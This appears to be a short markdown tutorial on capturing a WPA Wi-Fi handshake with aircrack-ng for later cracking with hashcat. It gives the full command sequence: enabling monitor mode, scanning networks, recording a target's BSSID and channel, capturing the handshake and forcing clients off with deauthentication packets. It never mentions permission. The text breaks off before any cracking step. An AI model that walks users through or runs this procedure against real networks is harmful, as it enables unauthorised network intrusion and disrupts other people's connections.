**Tools to use:**
1. `Aircrack-ng` --> capture handshake and bruteforce
2. `hashcat` --> advance cracking algorithm

## How?
### Get the handshake
Use aircrack-ng to capture the handshake
1. Enter root to avoid typing sudo repeteadly
```pyhton
sudo su
```
2. check wireless interface
```python
iwconfig
```
3. kill conflicting process
```python
airmon-ng check kill
```
4.  start monitor mode
```python
airmon-ng start wlan0
```
Verify monitor mode:
```python
iwconfig
```
5. Scan all networks
```python
airodump-ng wlan0mon
```
This scans all channels and shows every Wi-Fi network in range.
6. Stop and Record Target Information
*ctrl + c to stop the scan*
   - important to notice:
     - BSSID (router mac address)
     - CH (Channel)
     - ESSID (network name)
7. Capturing the Handshake
```python
airodump-ng -c [CH] --bssid [BSSID] -w capture [interface_name]
```
- wait the handshake: [ WPA handshake: 12:34:56:78:9A:BC ] at top corner
- or force reconnection by opening new terminal and ```sudo su
aireplay-ng --deauth 10 -a 12:34:56:78:9A:BC wlan0mon```
8. ctrl + c to stop the capture
